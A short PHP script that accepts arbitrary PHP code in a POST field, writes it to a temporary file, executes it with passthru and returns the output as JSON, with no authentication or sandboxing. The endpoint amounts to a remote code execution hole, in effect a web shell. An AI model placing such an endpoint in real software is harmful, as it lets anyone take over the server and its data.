<?php
if(isset($_POST['code'])) {
  $code = $_POST['code'];

  // Save the code to a temporary file
  $file = tempnam(sys_get_temp_dir(), 'exec');
  file_put_contents($file, $code);

  // Execute the code and capture the output
  ob_start();
  passthru("php $file");
  $output = ob_get_clean();

  // Delete the temporary file
  unlink($file);

  // Return the output as a JSON object
  header('Content-Type: application/json');
  echo json_encode(array('output' => $output));
}
?>
